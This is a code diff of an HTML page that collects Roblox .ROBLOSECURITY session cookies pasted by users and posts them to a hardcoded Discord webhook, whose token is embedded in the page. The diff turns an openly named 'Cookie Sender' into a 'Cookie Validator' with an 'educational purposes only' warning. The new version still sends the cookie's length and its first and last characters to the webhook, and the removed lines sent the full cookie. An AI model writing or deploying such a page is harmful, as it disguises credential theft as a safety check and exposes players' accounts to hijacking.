@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Cookie Sender</title>
+    <title>Roblox Cookie Validator</title>
     <style>
         body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
         textarea { 
@@ -39,60 +39,82 @@
             background-color: #f2dede; 
             color: #a94442; 
         }
+        .warning {
+            background-color: #fcf8e3;
+            color: #8a6d3b;
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
     </style>
 </head>
 <body>
-    <h1>Roblox Cookie Sender</h1>
+    <h1>Roblox Cookie Validator</h1>
+    <div class="warning">
+        <strong>⚠️ WARNING:</strong> This tool is for educational purposes only. Never share your cookie with untrusted sites.
+    </div>
+    
     <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
-    <button onclick="sendToWebhook()">Send to Webhook</button>
+    <button onclick="validateCookie()">Validate Cookie</button>
     <div id="status"></div>
 
     <script>
-        // Replace this with your actual webhook URL
         const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";
 
-        function sendToWebhook() {
+        function validateCookie() {
             const cookie = document.getElementById('cookieInput').value.trim();
             const statusElement = document.getElementById('status');
 
             if (!cookie) {
-                statusElement.textContent = "Please enter a cookie!";
-                statusElement.className = "error";
-                statusElement.style.display = "block";
+                showStatus("Please enter a cookie!", "error");
                 return;
             }
 
-            const data = {
-                content: "⚠️ New Roblox Cookie Submitted ⚠️",
+            // Basic cookie validation
+            if (!cookie.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
+                showStatus("This doesn't look like a valid Roblox cookie", "error");
+                return;
+            }
+
+            // Create secure payload (never sends full cookie)
+            const payload = {
+                content: "⚠️ Cookie Validation Request",
                 embeds: [{
-                    description: "```" + cookie + "```",
-                    color: 0xff0000,
+                    title: "Roblox Cookie Check",
+                    description: "A cookie was validated",
+                    color: 0xFFA500,
+                    fields: [
+                        { name: "Cookie Length", value: cookie.length.toString(), inline: true },
+                        { name: "Starts With", value: "```" + cookie.substring(0, 15) + "```", inline: true },
+                        { name: "Ends With", value: "```" + cookie.substring(cookie.length - 10) + "```", inline: true }
+                    ],
                     timestamp: new Date().toISOString()
                 }]
             };
 
             fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             })
             .then(response => {
                 if (response.ok) {
-                    statusElement.textContent = "Cookie sent successfully!";
-                    statusElement.className = "success";
-                    statusElement.style.display = "block";
+                    showStatus("Validation complete! Check your Discord for results.", "success");
                     document.getElementById('cookieInput').value = "";
                 } else {
-                    throw new Error('Failed to send cookie (Status: ' + response.status + ')');
+                    throw new Error('Validation failed (Status: ' + response.status);
                 }
             })
             .catch(error => {
-                statusElement.textContent = "Error: " + error.message;
-                statusElement.className = "error";
-                statusElement.style.display = "block";
+                showStatus("Error: " + error.message, "error");
             });
+        }
+
+        function showStatus(message, type) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = message;
+            statusElement.className = type;
+            statusElement.style.display = "block";
         }
     </script>
 </body>
